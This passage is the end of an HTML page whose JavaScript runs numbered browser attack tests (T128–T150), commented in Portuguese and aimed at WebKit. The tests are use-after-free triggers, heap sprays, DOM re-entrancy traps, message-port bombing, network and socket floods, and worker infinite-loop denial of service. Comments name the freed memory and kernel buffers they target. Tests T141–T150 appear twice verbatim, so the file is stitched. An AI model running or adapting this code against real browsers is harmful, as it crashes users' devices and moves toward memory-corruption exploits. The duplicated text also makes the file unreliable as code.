        reqs.push(xhr);
        
        if(reqs.length > 500) {
            log(".. XHR Objects holding text: " + reqs.length);
            if(reqs.length > 2000) clearInterval(t);
        }
    }, 10);
}

function runTest128() {
    log("Iniciando T128: Canvas PutImageData Align Fail...");
    var c = document.createElement('canvas');
    c.width = 1023; // Largura não potência de 2/4/8 para testar alinhamento
    c.height = 1023;
    var ctx = c.getContext('2d');
    
    try {
        var buf = new Uint8ClampedArray(1023 * 1023 * 4);
        buf.fill(128);
        var img = new ImageData(buf, 1023, 1023);
        
        for(var i=0; i<100; i++) {
            ctx.putImageData(img, 0, 0);
            // Lê de volta com offset estranho
            var sub = ctx.getImageData(1, 1, 1000, 1000);
            
            if(i % 10 === 0) {
                // Aloca textura GPU concorrente
                var tempC = document.createElement('canvas');
                tempC.width = 2048; tempC.height = 2048;
                tempC.getContext('2d').fillRect(0,0,1,1);
            }
        }
        log(">> T128: Unaligned image data transfer done.");
    } catch(e) { log(">> T128 GPU Error: " + e.message); }
}

function runTest129() {
    log("Iniciando T129: Blob Slice Recursion Depth...");
    var base = new Blob(["start".repeat(1000)]);
    var curr = base;
    
    try {
        for(var i=0; i<1000; i++) {
            // Cria cadeia profunda de referências de Blob
            // Kernel precisa rastrear offset + parent para cada fatia
            curr = curr.slice(1, curr.size);
            
            if(i % 100 === 0) {
                var u = URL.createObjectURL(curr);
                // Não revoga URL para manter a cadeia viva
            }
        }
        log(">> T129: Blob slicing depth 1000 reached.");
    } catch(e) {
        log(">> T129 Limit: " + e.message);
    }
}

function runTest130() {
    log("Iniciando T130: Iframe Reload Memory Leak...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        count++;
        // Cria objetos grandes no contexto do frame antes de recarregar
        try {
            f.contentWindow.leak = new Array(100000).fill(1.2345);
            f.contentWindow.document.body.innerHTML = "<div></div>".repeat(2000);
        } catch(e){}
        
        if(count < 200) {
            f.contentWindow.location.reload();
        } else {
            document.body.removeChild(f);
            log(">> T130: Frame reload cycles: " + count);
        }
    };
    f.src = "about:blank";
}
function runTest131() {
    log("Iniciando T131: History State Cyclic Bomb...");
    var a = [];
    var b = {};
    for(var i=0; i<500; i++) {
        var o = {id: i, data: new Uint8Array(255).fill(i)}; 
        a.push(o);
        if(i % 50 === 0) b["k"+i] = a; 
    }
    a.push(b); 
    
    try {
        // Serialização profunda do WebKit tenta processar ciclos ou falha
        // Tamanhos ajustados para causar pressão no buffer de IPC
        history.pushState(a, "Title", "?len=" + a.length);
        log(">> T131: State pushed (Serialization heavy).");
        
        // Substituição rápida para forçar free() no objeto anterior
        setTimeout(function() {
            history.replaceState(null, null, null);
            var spray = new ArrayBuffer(1024 * 1024);
        }, 10);
    } catch(e) { log(">> T131 Serialization Error: " + e.message); }
}

function runTest132() {
    log("Iniciando T132: Message Channel Port Clone Loop...");
    var channel = new MessageChannel();
    var p1 = channel.port1;
    var p2 = channel.port2;
    var transferList = [];
    
    try {
        for(var i=0; i<100; i++) {
            var mc = new MessageChannel();
            transferList.push(mc.port1);
            transferList.push(mc.port2);
        }
        
        // Envia centenas de portas através de um único canal
        // O Kernel precisa duplicar os descritores de arquivo (file descriptors) para todas elas
        p1.postMessage("clone_attack", transferList);
        
        p2.onmessage = function(e) {
            var ports = e.ports;
            // Fecha metade e mantém metade para fragmentar a tabela de handles
            for(var j=0; j<ports.length; j+=2) {
                ports[j].close();
            }
            log(".. Ports processed: " + ports.length);
        };
        log(">> T132: Port bombing sent.");
    } catch(e) { log(">> T132 Kernel Limit: " + e.message); }
}

function runTest133() {
    log("Iniciando T133: Node Filter Re-entrancy Trap...");
    var d = document.createElement('div');
    d.innerHTML = "<span>A</span><b>B</b>".repeat(200);
    
    var ni = document.createNodeIterator(d, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                // Modifica o DOM durante a iteração do filtro
                // Isso é um vetor clássico de UAF em motores antigos
                d.innerHTML = ""; 
                var junk = document.createElement('img'); // Tenta ocupar memória liberada
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    
    try {
        while(ni.nextNode()) {} 
        log(">> T133: Iterator logic survived.");
    } catch(e) { log(">> T133 Crash Logic: " + e.message); }
}

function runTest134() {
    log("Iniciando T134: DOM Implementation Prototype Spray...");
    var proto = DOMImplementation.prototype;
    var originals = {};
    var props = ["createDocument", "createHTMLDocument", "createDocumentType"];
    
    try {
        // Hook nas funções nativas para inserir alocações
        props.forEach(function(p) {
            originals[p] = proto[p];
            proto[p] = function() {
                var arr = new Array(100);
                for(var i=0; i<100; i++) arr[i] = document.createTextNode("spray");
                return originals[p].apply(this, arguments);
            };
        });
        
        for(var i=0; i<500; i++) {
            document.implementation.createHTMLDocument("test" + i);
        }
        log(">> T134: Prototype hooks executed.");
    } catch(e) { log(">> T134 Erro: " + e.message); }
    
    // Restaura para não quebrar o log
    props.forEach(function(p) { proto[p] = originals[p]; });
}

function runTest135() {
    log("Iniciando T135: Text Encoder Stream Fragmentation...");
    var enc = new TextEncoder();
    var huge = "X".repeat(1024 * 1024);
    var store = [];
    
    try {
        for(var i=0; i<50; i++) {
            // Encode em pedaços grandes força alocações de buffer no heap do WebKit
            var u8 = enc.encode(huge);
            // Cria "fatias" (views) que apontam para o buffer original
            for(var j=0; j<10; j++) {
                store.push(u8.subarray(j*1000, (j+1)*1000));
            }
            // Dereferencia o buffer principal, mas mantém as views
            // O GC não pode liberar o buffer grande enquanto houver views
            u8 = null;
        }
        log(">> T135: Buffer views created: " + store.length);
    } catch(e) { log(">> T135 OOM: " + e.message); }
}

function runTest136() {
    log("Iniciando T136: Fetch API Keep-Alive Flood...");
    var count = 0;
    
    var t = setInterval(function() {
        // fetch com keepalive=true tenta manter a conexão aberta no nível do sistema
        // Enviando payload grande para encher buffers de socket
        var body = new Uint8Array(1024 * 64).fill(0x41);
        fetch("/", {
            method: "POST",
            body: body,
            keepalive: true
        }).catch(e => {});
        
        count++;
        if(count > 1000) {
            clearInterval(t);
            log(">> T136: Keep-alive flood stop.");
        }
    }, 5);
}

function runTest137() {
    log("Iniciando T137: Blob Slice Memory Mapping Fail...");
    var parts = [];
    for(var i=0; i<1000; i++) parts.push("part"+i);
    var b = new Blob(parts); // Blob fragmentado
    
    try {
        var slices = [];
        for(var j=0; j<5000; j++) {
            // Fatias pequenas e aleatórias
            var start = Math.floor(Math.random() * b.size);
            var end = start + 10;
            slices.push(b.slice(start, end));
        }
        
        // Tenta ler todas as fatias simultaneamente
        var fr = new FileReader();
        fr.readAsArrayBuffer(slices[slices.length-1]); 
        
        log(">> T137: Blob mapping table stressed.");
    } catch(e) { log(">> T137 Kernel Map Error: " + e.message); }
}

function runTest138() {
    log("Iniciando T138: Sync XHR Recursive Open...");
    var depth = 0;
    
    function recurse() {
        depth++;
        if(depth > 100) return;
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/", false); // Sync
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) {
                recurse(); // Recursão dentro do callback sync
            }
        };
        try { xhr.send(); } catch(e){}
    }
    
    try {
        recurse();
        log(">> T138: Sync recursion depth: " + depth);
    } catch(e) { log(">> T138 Stack/Net Error: " + e.message); }
}

function runTest139() {
    log("Iniciando T139: Worker Import Scripts DoS...");
    var scriptURL = URL.createObjectURL(new Blob(["while(1){}"], {type: 'application/javascript'}));
    var workers = [];
    
    try {
        for(var i=0; i<20; i++) {
            var b = new Blob([
                "try { importScripts('" + scriptURL + "'); } catch(e) {}"
            ], {type: 'application/javascript'});
            
            var w = new Worker(URL.createObjectURL(b));
            workers.push(w);
        }
        
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T139: ImportScripts load stop.");
        }, 3000);
        log(">> T139: Workers importing loops launched.");
    } catch(e) { log(">> T139 Error: " + e.message); }
}

function runTest140() {
    log("Iniciando T140: Iframe Src Javascript URI Loop...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        // Javascript URI que cria um loop de navegação dentro do frame
        f.src = "javascript:window.location.reload()";
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 50) {
            var dead = frames.shift();
            dead.src = "about:blank"; // Tenta cancelar navegação pendente
            container.removeChild(dead);
        }
        
        if(frames.length > 200) {
            clearInterval(t);
            log(">> T140: URI Loop cycle finished.");
        }
    }, 50);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}
</script>

</body>
</html>
